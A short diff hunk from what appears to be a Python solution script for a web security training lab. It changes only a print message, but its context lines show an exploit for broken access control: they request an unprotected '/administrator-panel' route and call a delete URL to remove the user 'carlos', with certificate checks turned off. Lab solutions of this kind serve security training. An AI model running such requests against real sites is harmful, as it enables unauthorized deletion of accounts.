@@ -9,7 +9,7 @@ def delete_user(url):
     admin_panel_url = url + '/administrator-panel'
     r = requests.get(admin_panel_url, verify=False, proxies=proxies)
     if r.status_code == 200:
-        print('(+) Found the administrator panel!')
+        print('(+) Found the administrator panel! - re-comit')
         print('(+) Deleting Carlos user...')
         delete_carlos_url = admin_panel_url + '/delete?username=carlos'
         r = requests.get(delete_carlos_url, verify=False, proxies=proxies)
